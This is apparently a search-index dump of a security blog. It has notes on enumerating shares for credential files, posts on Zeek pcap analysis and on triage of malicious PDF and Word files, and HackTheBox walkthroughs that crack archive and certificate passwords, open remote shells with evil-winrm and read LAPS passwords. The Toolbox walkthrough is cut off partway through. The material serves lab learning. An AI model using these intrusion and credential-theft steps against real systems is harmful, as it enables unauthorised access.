command <code>dir</code>.</p> <pre><code>PS C:\\xyz&gt; N:\nPS N:\\&gt; (Get-ChildItem -File -Recurse | Measure-Object).Count\n\n29302\n</code></pre> <p>We can use the property <code>-Include</code> to find specific items from the directory specified by the Path parameter.</p> <pre><code>PS C:\\xyz&gt; Get-ChildItem -Recurse -Path N:\\ -Include *cred* -File\n\n    Directory: N:\\Contracts\\private\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-a----         2/23/2022   4:36 PM             25 credentials.txt\n</code></pre> <p>The <code>Select-String</code> cmdlet uses regular expression matching to search for text patterns in input strings and files. We can use <code>Select-String</code> similar to <code>grep</code> in UNIX or <code>findstr.exe</code> in Windows.</p> <pre><code>PS C:\\xyz&gt; Get-ChildItem -Recurse -Path N:\\ | Select-String \"cred\" -List\n\nN:\\Contracts\\private\\secret.txt:1:file with all credentials\nN:\\Contracts\\private\\credentials.txt:1:admin:SecureCredentials!\n</code></pre>  <p>Linux - Mount <pre><code>secops@kali[/kali]$ sudo mkdir /mnt/Finance\nsecops@kali[/kali]$ sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance\n</code></pre></p> <p>As an alternative, we can use a credential file. <pre><code>secops@kali[/kali]$ mount -t cifs //192.168.220.129/Finance /mnt/Finance -o credentials=/path/credentialfile\n</code></pre></p> <p>The file <code>credentialfile</code> has to be structured like this:</p> <pre><code>username=plaintext\npassword=Password123\ndomain=.\n</code></pre> <p>Once a shared folder is mounted, you can use common Linux tools such as find or grep to interact with the file structure.</p> <pre><code>secops@kali[/kali]$ find /mnt/Finance/ -name *cred*\n\n/mnt/Finance/Contracts/private/credentials.txt\n</code></pre> <p>Find files that contain the string <code>cred</code>: <pre><code>secops@kali[/kali]$ grep -rn /mnt/Finance/ -ie cred\n\n/mnt/Finance/Contracts/private/credentials.txt:1:admin:SecureCredentials!\n/mnt/Finance/Contracts/private/secret.txt:1:file with all credentials\n</code></pre></p>  Command Line Utilities <p>MSSQL</p> <p>Linux - SQSH <pre><code>secops@kali[/kali]$ sqsh -S 10.129.20.13 -U username -P Password123\n</code></pre></p> <p>Windows - SQLCMD <pre><code>C:\\xyz&gt; sqlcmd -S 10.129.20.13 -U username -P Password123\n</code></pre></p> <p>MySQL</p> <p>Linux - MySQL <pre><code>secops@kali[/kali]$ mysql -u username -pPassword123 -h 10.129.20.13\n</code></pre></p> <p>Windows - MySQL <pre><code>C:\\xyz&gt; mysql.exe -u username -pPassword123 -h 10.129.20.13\n</code></pre></p>","title":"Interacting"},{"location":"blog/","text":"<p>This is where I write about security stuff, mostly.</p>","title":"Blog"},{"location":"blog/2022/09/17/pcap-analysis-using-zeek/","text":"<p>Summary</p> <p>You're being handed a really large network data capture and you want to figure out if theres anything malicious in it? But, there is too much data to manually go through? How can you easily tell if anything evil has happened or if there is totally normal traffic? There a variety of awesome free tools, like for example: Zeek.</p>   <p>I will be looking at The Zeek Network Security Monitor which is an awesome open source networking security monitoring tool.</p> <p>We can download packages for the latest feature release build here. I will chose <code>Ubuntu</code> since I'm doing this in a REMnux VM. After you chose your OS, select Add respository and install manually.</p> <p>Since REMnux is currently based on Ubuntu 20.04. I will run the following commands:</p> <pre><code>echo 'deb http://download.opensuse.org/repositories/security:/zeek/xUbuntu_20.04/ /' | sudo tee /etc/apt/sources.list.d/security:zeek.list\ncurl -fsSL https://download.opensuse.org/repositories/security:zeek/xUbuntu_20.04/Release.key | gpg --dearmor | sudo tee /etc/apt/trusted.gpg.d/security_zeek.gpg &gt; /dev/null\nsudo apt update\nsudo apt install zeek\n</code></pre> <p>Once this done, Zeek has been installed into <code>/opt/zeek/bin/</code></p> <pre><code>remnux@remnux:/opt/zeek/bin$ ls\nadtrace  bro-config  btest-ask-update     btest-diff      btest-rst-include  gen-zam        rst           spicy-driver              trace-summary  zeek-config   zkg\nbifcl    broctl      btest-bg-run         btest-diff-rst  btest-rst-pipe     hiltic         spicy-build   spicy-dump                zeek           zeekctl\nbinpac   bro-cut     btest-bg-run-helper  btest-progress  btest-setsid       hilti-config   spicyc        spicy-precompile-headers  zeek-archiver  zeek-cut\nbro      btest       btest-bg-wait        btest-rst-cmd   capstats           paraglob-test  spicy-config  spicyz                    zeek-client    zeek-wrapper\n</code></pre> <p>In this demo, I will be using <code>zeek-cut</code> and <code>zeek</code>.</p> <p>For this, we'll need a <code>.pcap</code> file. This can be any <code>.pcap</code> file you wish to analyze. I will be using an example from Malware-Traffic-Analysis. My example is a network capture from a Lokibot infection which was pushed through an Excel Spreadsheet.</p> <p>I'll be creating a clean folder, with nothing in it to work with:</p> <pre><code>remnux@remnux:~/Downloads$ cd /tmp/\nremnux@remnux:/tmp$ mkdir zeek\nremnux@remnux:/tmp$ cd zeek/\nremnux@remnux:/tmp/zeek$ ls\nremnux@remnux:/tmp/zeek$\n</code></pre> <p>First, we point zeek at the .pcap and let it run:</p> <pre><code>remnux@remnux:/tmp/zeek$ /opt/zeek/bin/zeek -r ~/Downloads/2020-10-12-Lokibot-infection-traffic.pcap\n</code></pre> <pre><code>remnux@remnux:/tmp/zeek$ ls\nconn.log  dns.log  files.log  http.log  packet_filter.log  pe.log  ssl.log  x509.log\n</code></pre> <p>Zeek will generate a couple of log files. These files have different names to describe what they're a log of.</p> <ul> <li><code>conn.log</code> : Tells you the Source and Destination IPs, Ports, Protocols</li> <li><code>dns.log</code> : Every DNS request</li> <li><code>files.log</code> : List of files</li> <li><code>http.log</code> : Every HTTP transaction</li> <li><code>pe.log</code> : Portable executables</li> <li><code>ssl.log</code> : TLS/SSL Connections</li> <li><code>x509.log</code> : TLS/SSL Connections</li> </ul> <p>As we can see, Zeek acts kind of like a prism. You put a <code>.pcap</code> file in and a bunch of <code>.log</code> files come out. First, let's look at <code>conn.log</code> as follows:</p> conn.log<pre><code>remnux@remnux:/tmp/zeek$ less -S conn.log\n</code></pre> <p></p> <p>Looking at the screenshot above, we have a bunch of columns. Everything is a little bit distanced from where it should be, so not every column is perfectly aligned. We can ignore the <code>#types</code> line, we are only interested in the <code>#fields</code> line.</p> <p>From the screenshot above, the abbreviations mean the following:</p> <ul> <li><code>ts</code> : Timestamp</li> <li><code>uid</code> : A unique identifier</li> <li><code>id_orig_h</code> : Source IP address</li> <li><code>id_resp_p</code> : Source Port</li> <li><code>id_resp_h</code> : Destination IP</li> <li><code>id_resp_p</code> : Destination Port</li> <li><code>proto_count</code> : Protocol used</li> </ul> dns.log<pre><code>remnux@remnux:/tmp/zeek$ less -S dns.log\n</code></pre> <p></p> <p>This shows us all dns requests that were being made, notice that this also provides us the unique identifiers.</p> http.log<pre><code>remnux@remnux:/tmp/zeek$ less -S http.log\n</code></pre> <p></p> <p>As we can see here, that person was making a <code>POST</code> request to <code>104.223.143.132 /ecflix/Panel/five/fre.php</code>.</p> <p>This gives us a great way to sort through the data in a <code>.pcap</code> file, whether its large or small.</p>","title":"PCAP Analysis using Zeek"},{"location":"blog/2022/09/17/pcap-analysis-using-zeek/#cutting-out-columns-of-interest","text":"<p>Let's say we want to know exactly what Domain Names someone was going to within that <code>.pcap</code>. We can do this using <code>zeek-cut</code>:</p> <p></p> <p>This will give us a unique list, of all domains that were looked up. If we want to see the count of how many times a domain was looked up we can do it as follows:</p> <p></p> <p>We see 1 request for <code>ctldl.windowsupdate.com</code>, 6 requests for <code>wpad.localdomain</code> and so on. This is a quick way of cutting through the pcap and getting a hold of all the dns requests.</p>","title":"Cutting out columns of interest"},{"location":"blog/2022/09/17/pcap-analysis-using-zeek/#looking-at-pe","text":"<p>Let's look at the <code>pe.log</code>. The fact that there is a <code>pe.log</code> means that someone downloaded an executable. Since we know, this was a malicious infection its pretty obvious that we are interested in that executable.</p> <p>pe.log<pre><code>remnux@remnux:/tmp/zeek$ less -S pe.log\n</code></pre> </p> <p>We don't have a lot info on the network connection but we have information that we can correlate against other log files, for example the <code>id</code> field which is a unique identifier as we've seen before.</p> <p>We can correlate this against other log files as follows:</p> <pre><code>remnux@remnux:/tmp/zeek$ grep FkmfCx13mub2PIRUO7 *.log\n</code></pre> <p></p> <p>From the screenshot above, we can see, <code>http.log</code> shows us where that executable download occured:</p> <ul> <li>Request from <code>10.10.12.101</code>, source port <code>49979</code></li> <li>to <code>45.14.112.133</code> destination port <code>80</code></li> <li>it was a <code>GET</code> request to <code>millsmiltinon[.]com</code></li> <li>to <code>/long random string/Xehmigm.exe</code></li> <li>with a <code>Mozilla User Agent</code></li> </ul> <p>As we can see above, it shows up in our <code>pe.log</code> as well. We can do this any identifier from <code>conn.log</code>.</p> <p>That's Zeek in a nutshell. </p> <p>It gives us all of these files to look through massive amounts of data, using the CLI or what is much, much better taking the files and putting them into a centralized collection source like a SIEM. Through this, we are taking our actual network packets into logs and metadata about the transactions that happened in those packets, then putting those logs into a SIEM where we can search them and corrolate them across all the other data we might have.</p>","title":"Looking at PE"},{"location":"blog/2022/09/16/analyzing-malicious-pdf-and-word-documents/","text":"<p>Summary</p> <p>How to address PDF files and Word Documents and extract malicious indicators from within them. This is something that happens nearly every day in a SOC. An example could be: A user reports phishing and our job as Security Anaylsts is, figuring out if these files are indeed malicious. Safely, quickly and accurately.</p>   <p>The easisest way to seclude malicious files it to put them into a virtual machine and then isolate that virtual machine from the rest of your network and your own personal computer. I will be using REMnux, a VM that is full of RE tools already pre-made.</p> <p>In this post I will be looking at a PDF file and a Word Document, both commonly used for phishing.</p>","title":"Analyzing Malicious PDF and Word Documents"},{"location":"blog/2022/09/16/analyzing-malicious-pdf-and-word-documents/#malicious-pdf","text":"<p>For the PDF exmaple I chose a real-world example from any.run. Going to public submissions, we can find a ton of files which were submitted by other people. The filter I applied was: File: Adobe PDF, Verdict: Malicious.</p> <p></p> <p>Download the archive, and unzip it. The password for files like this will almost always be <code>infected</code>.</p> <p></p> <p>As <code>RecentPurchase.pdf</code> is probably malicious, we want to avoid opening it. There's an easy way to extract what might be inside. Many malicious PDFs contain a link which try to trick the user into clicking that link. One of the easy ways we can do this is using the <code>strings</code> command. To get a fast answer - without having a sandbox - is looking for the letters <code>http</code> anywhere inside the PDF. </p> <p>We can do this via the following command</p> <pre><code>remnux@remnux:~/Downloads$ strings RecentPurchase.pdf | grep http\n&lt;&lt;/IsMap false /S /URI /Type /Action /URI ([https]://0x7signin463ewgs[.]nolcarrybackcaresact[.]com/aTcqdFa)&gt;&gt;\nremnux@remnux:~/Downloads$ \n</code></pre> <p>This <code>PDF</code> probably is a malicious phishing attempt to get people to go the above link. </p> <p>If you don't have a sandbox, you don't want to open it or don't have any other way of figuring out if the file is malicious, this is the manual, fast and easy way to extracting a link of a PDF without having any kind of danger involved since you are only parsing the PDF byte by byte because you're not opening the file.</p> <p>If we want to actually see, what the PDF is showing when opened, we can do this using any.run. The cool thing about any.run is, it shows us what the PDF would look like.</p> <p></p> <p>This looks like a fake Apple Appstore receipt. Some kind of Apple credential phising page trying to get peoples iCloud credentials.</p>","title":"Malicious PDF"},{"location":"blog/2022/09/16/analyzing-malicious-pdf-and-word-documents/#malicious-word-document","text":"<p>For the Word Document I will use a sample from Hybrid Analysis. Searching for files requires an account. I used the Advanced Search with the filter: Filetype: doc, Verdict: Malicious.</p> <p></p> <p>Often times invoice themed phishing documents are a Word document. Hybrid Analysis already tells us that the file is malicious, but let's see if we can check this the manual way since a user might get a phish that is not yet submitted anywhere. </p> <p>Word documents are different compared to a PDF. They are much more complex and we generally can't just use strings on them to get meaningful output. However, we can use some tools that are build into REMnux to get indicators if we are dealing with a malicious file or not.</p> <p>One of the tools we can use is called <code>olevba</code> (ole being the name of the file format).</p> <p>Download the file, unzip it then we can run <code>olevba</code> on it as follows:</p> <p></p> <p>After running this, we will get a summary at the bottom:</p> <p></p> <p>Autoexec means theres an automatic execution on <code>Document_open</code> (when the Document is opened) for something trying to happen. Bad sign for any kind of Word Document. </p> <p>As seen below, it prints the macro above the summary. One way we can tell we're looking at a malicious Word Document is a macro that automatically opens and that macro is heavily obfuscated like in this example:</p> <p></p> <p>Seeing this we can quickly go from Is this bad?  to This is absolutely bad .</p> <p>We can go a little deeper on this, since this does not actually tell us what's happening when a user would open the Word Document. When we throw this into a sandbox we can see the following:</p> <p></p> <p>The Document runs <code>cmd.exe</code> with a base64 encoded command. If we want to understand what it does, we can copy the base64 encoded part and decode it in the terminal like so:</p> <pre><code>$ echo \"&lt;base 64 encoded part&gt; | base64 -d\"\n</code></pre> <p></p> <p>Now we have some heavily obfuscated Powershell, which is not a surprise. Often <code>cmd</code> is used to execute Powershell commands to download and execute more scripts, files etc. We can't really yet see what is really happening but we can notice the <code>Net.Webclient</code> (marked in red above), which is a function commonly used for downloading additional stuff. We can manually try to deobfuscate this, which would be a huge pain.</p> <p>What we could also do is, copy the Powershell part and run the code inside a Windows VM using Powershell ISE. This way we can see what all the variables of the Powershell command will turn into.</p>  <p>Info</p> <p>Make sure to disconnect the VM from the Network and take a snapshot of the VM prior. If you don't disconnect the VM from the Network, this will infect your machine.</p>  <p></p> <p>From this we can type <code>Get-Variable</code> to see all variables that were created once this was run.</p> <p></p> <p></p> <p>In a couple of seconds we took obfuscated Powershell and deobfuscated and extracted all the URLs the file tried to reach out to. Now the next step would be to look in our SIEM, Firewall- and Proxylogs and check that no user had gone to any of these URLs. If any user had gone to the URLs we'd need to follow up and see what happened next. We'd also want to block these links to make sure no one is able to get to these URLs.</p>","title":"Malicious Word Document"},{"location":"blog/2022/01/04/security-ramblings/","text":"<p>Hi there! This site is designed to cover various offensive &amp; defense security topics.</p> <p>On this blog I plan to share things I've learned. Mostly focused on hacking and security. I love to learn, but I love sharing the things that I have learned even more - that's what this blog is for. Feel free to get in touch via  Twitter or  E-Mail. I'm always up for a chat about security.</p>  <p>Feel free to check out the Docs section.</p>","title":"Security Ramblings"},{"location":"blog/2022/09/18/sending-powershell-messages-to-slack-using-webhooks/","text":"<p>Summary</p> <p>Setting up quick monitoring notifications that are sent via Powershell to Slack channels.</p>   <p>First, if you don't yet have slack installed, we will have to download Slack. To download Slack, go to Slack.com, click on 'Try it for free' and create an account or continue with a Google Account. </p> <p>This will automatically create a new workspace. Slack will automatically continue with the Slack webclient which is pretty bad. I recommend downloading the Slack App. For that, go to this link and download the App.</p> <p>Start the app and login with your account. Once you are logged in, give your workspace a name. The step 'add teammates' can be skipped if you don't plan on inviting more people. In the next step you will be asked to name a project you're currently working on. I named it 'Monitoring', since that is a fitting name for what we are going to do.</p> <p></p> <p>Click 'Next' once done, this will create the channel.</p> <p>Since this is a channel for Monitoring purposes, which might contain sensitive information, we might want to switch this channel to private. For this, right click on 'Monitoring' - 'View channel details' - and click on 'Change to a private channel'.</p>  <p>Info</p> <p>You don't have to do this for lab purposes, but it's generally a good security thing to do.</p>  <p></p> <p>Once this is done, we want to integrate the Webhook into our channel. For that, go to Integrations, add an app and search for 'Webhook' and add the following app:</p> <p></p> <p>Add the App to your channel and make sure to note down the Webhook URL of your channel which is shown in the process. We will need this URL to setup the Powershell messages.</p> <p></p> <p>Once we successfully added the app, we can look at how to send messages from the system we wish to monitor. So, how do we send messages to the channel now? We can do this in a quick way using Powershell.</p> <p>From the system you want to monitor/send messages from, open up Powershell. The code will consist of 2 parts. First:</p> The body variable<pre><code>$body = ConvertTo-Json @{\n    username = \"Bot\"\n    pretext = \"Automated Alert\"\n    text= \"Important Message\"\n}\n</code></pre> The actual HTTPS request<pre><code>Invoke-RestMethod https://hooks.slack.com/services/&lt;your link&gt; -Method Post -Body $body -ContentType 'application/json'\n</code></pre> <p>The final result should look as follows:</p> <p></p> <p>Once this is sent, we will receive the message in the corresponding slack channel almost instantly:</p> <p></p> <p>From here, we could modify this as we wish.</p> <p>If we'd want to give the Bot an Icon, we can change the the code as follows:</p> <p><pre><code>$body = ConvertTo-Json @{\n    username = \"Bot\"\n    pretext = \"Automated Alert\"\n    text= \"Important Message\"\n    icon_emoji= \"ghost\"\n}\n</code></pre> There are multiple emoji's you can use, this is just an example. The result should look like this:</p> <p></p>  <p>Info</p> <p>For this to update correctly, you might have to send a message yourself to the channel and/or send the Bot message multiple times because of caching.</p>  <p>Once we made sure this works, we can look at how to get meaningful information back, since currently we are not getting back any useful monitoring information. What we could do for example, as a start, is getting back the hostname and the current user, from the system the message is coming from.</p> <p>We can do that as follows:</p> <pre><code>$msg = \"Hostname: ${env:computername}`nUsername: ${env:username}\"\n$body = ConvertTo-Json @{\n    username = \"Bot\"\n    pretext = \"Automated Alert\"\n    text= $msg\n    icon_emoji= \"ghost\"\n}\n</code></pre> <p>Then, send the message to the channel again:</p> <pre><code>Invoke-RestMethod https://hooks.slack.com/services/&lt;your link&gt; -Method Post -Body $body -ContentType 'application/json'\n</code></pre> <p>This should look as follows:</p> <p></p> <p>And we should be receiving the alert instantly:</p> <p></p> <p>This sets the base for more indepth and automated monitoring we can set up in the future. In future posts, I will take a look at how to use this in combination with Sysmon to send automated messages upon unwanted actions such as Blocking unwanted files which can be super helpful.</p>","title":"Sending Powershell Messages to Slack using Webhooks"},{"location":"blog/2022/09/05/hackthebox-timelapse/","text":"<p></p>  <p>Summary</p> <p>Timelapse is a Windows Machine that involves accessing a publicly accessisble SMB share. Cracking a .zip file containing a .pfx file that can be used to authenticate to a DC. Upon establshing a foothold we hunt for credentials and utilize a Domain Group to obtain a Password via LAPS and thus gain administrative access on the Domain Controller.</p>","title":"HackTheBox - Timelapse"},{"location":"blog/2022/09/05/hackthebox-timelapse/#enumeration","text":"<p>As always, we start off with a <code>nmap</code> scan.</p> <pre><code>\u2514\u2500$ sudo nmap -sC -A 10.129.227.105 -oA Evidence/Scans/1k\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-09-05 19:31 CEST\nNmap scan report for 10.129.227.105\nHost is up (0.031s latency).\nNot shown: 989 filtered tcp ports (no-response)\nPORT     STATE SERVICE           VERSION\n53/tcp   open  domain            Simple DNS Plus\n88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2022-09-06 01:31:59Z)\n135/tcp  open  msrpc             Microsoft Windows RPC\n139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn\n389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  ldapssl?\n3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)\n3269/tcp open  globalcatLDAPssl?\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nOS fingerprint not ideal because: Missing a closed TCP port so results incomplete\nNo OS matches for host\nNetwork Distance: 2 hops\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: 7h59m57s\n| smb2-time: \n|   date: 2022-09-06T01:32:15\n|_  start_date: N/A\n| smb2-security-mode: \n|   3.1.1: \n|_    Message signing enabled and required\n\nTRACEROUTE (using port 445/tcp)\nHOP RTT      ADDRESS\n1   28.23 ms 10.10.14.1\n2   28.33 ms 10.129.227.105\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 74.39 seconds\n</code></pre> <p>From the scan, we can see that we are dealing with a Domain Controller. It's worth noting down the domain: <code>timelapse.htb</code>. Let's enumerate the services and start off with SMB.</p> <pre><code>$ smbclient -N -L //10.129.227.105                     \n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        NETLOGON        Disk      Logon server share \n        Shares          Disk      \n        SYSVOL          Disk      Logon server share \nReconnecting with SMB1 for workgroup listing.\ndo_connect: Connection to 10.129.227.105 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/htb/timelapse]\n\u2514\u2500$ smbclient //10.129.227.105/Shares\nPassword for [WORKGROUP\\kali]:\nTry \"help\" to get a list of possible commands.\nsmb: \\&gt; dir\n  .                                   D        0  Mon Oct 25 17:39:15 2021\n  ..                                  D        0  Mon Oct 25 17:39:15 2021\n  Dev                                 D        0  Mon Oct 25 21:40:06 2021\n  HelpDesk                            D        0  Mon Oct 25 17:48:42 2021\n\n                6367231 blocks of size 4096. 1286478 blocks available\nsmb: \\&gt; cd Dev\nsmb: \\Dev\\&gt; dir\n  .                                   D        0  Mon Oct 25 21:40:06 2021\n  ..                                  D        0  Mon Oct 25 21:40:06 2021\n  winrm_backup.zip                    A     2611  Mon Oct 25 17:46:42 2021\n\n                6367231 blocks of size 4096. 1286478 blocks available\nsmb: \\Dev\\&gt; get winrm_backup.zip \ngetting file \\Dev\\winrm_backup.zip of size 2611 as winrm_backup.zip (1.1 KiloBytes/sec) (average 1.1 KiloBytes/sec)\nsmb: \\Dev\\&gt; exit\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/htb/timelapse]\n\u2514\u2500$ unzip winrm_backup.zip \nArchive:  winrm_backup.zip\n[winrm_backup.zip] legacyy_dev_auth.pfx password: \npassword incorrect--reenter:\n</code></pre> <p>Looking at the output above, we can see that anonymous access is enabled and we obtain <code>winrm_backup.zip</code>. We can't extract it yet, since it's password protected. However, we can try cracking it using <code>john</code>.</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/htb/timelapse]\n\u2514\u2500$ zip2john winrm_backup.zip &gt; zip.john\nver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/htb/timelapse]\n\u2514\u2500$ john zip.john --wordlist=/usr/share/wordlists/rockyou.txt\nUsing default input encoding: UTF-8\nLoaded 1 password hash (PKZIP [32/64])\nNo password hashes left to crack (see FAQ)\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/htb/timelapse]\n\u2514\u2500$ john zip.john --wordlist=/usr/share/wordlists/rockyou.txt --show\nInvalid options combination: \"--show\"\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/htb/timelapse]\n\u2514\u2500$ john zip.john --show                                            \nwinrm_backup.zip/legacyy_dev_auth.pfx:&lt;REDACTED&gt;:legacyy_dev_auth.pfx:winrm_backup.zip::winrm_backup.zip\n\n1 password hash cracked, 0 left\n</code></pre> <p>We successfully obtain the password. The archive contains a <code>.pfx</code> file. </p> <p>According to this post, a .pfx file, which is in a <code>PKCS#12</code> format, contains the SSL certificate (public keys) and the corresponding private keys.</p> <p>Running <code>strings</code> on the .pfx file, we can see that this is probably used to authenticate to a domain, for the user <code>legacyy</code>.</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/htb/timelapse]\n\u2514\u2500$ strings legacyy_dev_auth.pfx     \n_       Er\nC(!,\n4bz'\n`o&lt;l\n|Y4W\nI0{Q\nL(vqQ#\n{q[l\"8\n`+$DOC\nhK*y\n;5UERr\nX!+3\n&amp;JCy\n$-1f\nNAM'u\n\"-r$$\nLegacyy0\n211025140552Z\n311025141552Z0\nLegacyy0\nr\"*J0:\ncZK3\n\".G,\nx0v0\nlegacyy@timelapse.htb0\n}J5~f\nt{(lz\n5&amp;8H\n&amp;4&lt;6\nkj@1\nuUh2s\n</code></pre> <p>However, trying to extract the corresponding certificate doesn't work. The file is password protected. We can use the previously obtained password from the .zip archive, but no luck.</p> <p>Using <code>pfx2john</code> we can obtain the hash and try to crack it again.</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/htb/timelapse]\n\u2514\u2500$ pfx2john legacyy_dev_auth.pfx &gt; pfx.john\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/htb/timelapse]\n\u2514\u2500$ john pfx.john --wordlist=/usr/share/wordlists/rockyou.txt\nUsing default input encoding: UTF-8\nLoaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])\nNo password hashes left to crack (see FAQ)\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/htb/timelapse]\n\u2514\u2500$ john pfx.john --show                                     \nlegacyy_dev_auth.pfx:thuglegacy:::::legacyy_dev_auth.pfx\n\n1 password hash cracked, 0 left\n</code></pre> <p>Perfect, we got the password. Time to extract the SSL certificate (public keys) and the corresponding private key.</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/htb/timelapse]\n\u2514\u2500$ openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem\nEnter Import Password:\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/htb/timelapse]\n\u2514\u2500$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes\nEnter Import Password:\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/htb/timelapse]\n\u2514\u2500$ ls\nAdmin  cert.pem  Deliverables  Evidence  key.pem  legacyy_dev_auth.pfx  pfx.john  Retest  winrm_backup.zip  zip.john\n</code></pre> <p>Let's see if we can authenticate to the DC now.</p>","title":"Enumeration"},{"location":"blog/2022/09/05/hackthebox-timelapse/#lateral-movement","text":"<pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/htb/timelapse]\n\u2514\u2500$ evil-winrm -i 10.129.227.105 -u legacyy -c cert.pem -k key.pem -S\n\nEvil-WinRM shell v3.4\n\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\n\nData: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\nWarning: SSL enabled\n\nInfo: Establishing connection to remote endpoint\n\n*Evil-WinRM* PS C:\\Users\\legacyy\\Documents&gt;\n</code></pre> <p>This works, we are in. We can probably grab the first flag.</p> <pre><code>*Evil-WinRM* PS C:\\Users\\legacyy\\Documents&gt; ls\n*Evil-WinRM* PS C:\\Users\\legacyy\\Documents&gt; cd ..\\Desktop\n*Evil-WinRM* PS C:\\Users\\legacyy\\Desktop&gt; ls\n\n\n    Directory: C:\\Users\\legacyy\\Desktop\n\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-ar---         9/5/2022   6:30 PM             34 user.txt\n</code></pre> <p>Now we have multiple options, we can go straight into <code>Bloodhound</code>, we could automate enumeration using e.g. <code>Winpeas</code> or we could do some manual enumeration. A good first thing to check is the PowerShell history. Let's start with that:</p> <p></p> <p>Looks like we obtain credentials for the account <code>svc_deploy</code>. This might be a service account used for deployment. Serviceaccounts can be high value targets. A quick check with <code>crackmapexec</code> verifies that the credentials work.</p> <p>Let's see if we can login via that account:</p> <p></p>","title":"Lateral Movement"},{"location":"blog/2022/09/05/hackthebox-timelapse/#privilege-escalation","text":"<p>Next, we should check what kind of privileges this account has:</p> <p></p> <p>The account is part of the <code>LAPS Readers</code> Group. LAPS provides management of local account passwords of domain joined computers. Passwords are stored in Active Directory (AD) and protected by ACL, so only eligible users can read it or request its reset. The password then can be read from Active Directory by users who are allowed to do so. Eligible users can request a password change for a computer.</p> <p>If we are eligible to read it, we might be able to obtain Administrator credentials and login.</p> <p>Using the following query we can check if we can successfully read it:</p> <p></p> <p>Success, we obtained the cleartext password for the local <code>administrator</code> account. We should be able to login with those credentials:</p> <p></p>  <p>Note: It's not necessary to pixelate the password above. LAPS randomly generates passwords that are then automatically changed on managed machines.</p>  <p>That's it. We have successfully gained administrative access on the DC and can grab the root flag.</p>","title":"Privilege Escalation"},{"location":"blog/2022/09/15/hackthebox-toolbox/","text":"<p></p>  <p>Summary</p> <p>Toolbox is a Windows Machine that involves a Docker Toolbox install. A Linux Container is hosted, which serves a website that is eventually vulnerable to SQL injection. Utilizing this, we can establish a foothold. Leveraging Docker Toolbox default credentials to escape the Docker Container and getting a privileged shell on the Windows Host.</p>","title":"HackTheBox - Toolbox"},{"location":"blog/2022/09/15/hackthebox-toolbox/#enumeration","text":"<p><code>nmap</code> shows several open ports.</p> <pre><code>PORT    STATE SERVICE                                                                                                                                                                  \n21/tcp  open  ftp                                                                                                                                                                      \n22/tcp  open  ssh                                                                                                                                                                      \n135/tcp open  msrpc                                                                                                                                                                    \n139/tcp open  netbios-ssn                                                                                                                                                              \n443/tcp open  https                                                                                                                                                                    \n445/tcp open  microsoft-ds\n</code></pre>   <p>Starting off with FTP, since anonymous login is allowed.</p> <pre><code>$ ftp 10.129.96.171             \nConnected to 10.129.96.171.\n220-FileZilla Server 0.9.60 beta\n220-written by Tim Kosse (tim.kosse@filezilla-project.org)\n220 Please visit https://filezilla-project.org/\nName (10.129.96.171:kali): anonymous\n331 Password required for anonymous\nPassword: \n230 Logged on\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp&gt; dir\n229 Entering Extended Passive Mode (|||50177|)\n150 Opening data channel for directory listing of \"/\"\n-r-xr-xr-x 1 ftp ftp      242520560 Feb 18  2020 docker-toolbox.exe\n226 Successfully transferred \"/\"\nftp&gt; \n</code></pre> <p>Looking at the file named <code>docker-toolbox.exe</code>, it's possible that the host is running Docker Toolbox to host containers.</p>   <p>Using Port 443, we get a certificate warning, since the certificate is self-signed. A website for a company 'Megalogistics' is shown.</p> <p></p> <p>Nikto shows that the SSL certificate is valid for <code>admin.megalogistic.com</code>. </p> <p></p> <p>Adding this to <code>/etc/host/</code> and browsing to the site, a login form can be found.</p> <p></p> <p>Trying to login with default credentials e.g. <code>admin:admin</code> is not successful. We can intercept the request with burp, save it to a file so we can utilize it via sqlmap.</p> <p></p> <p>To check if the site is vulnerable to SQLi, we'll 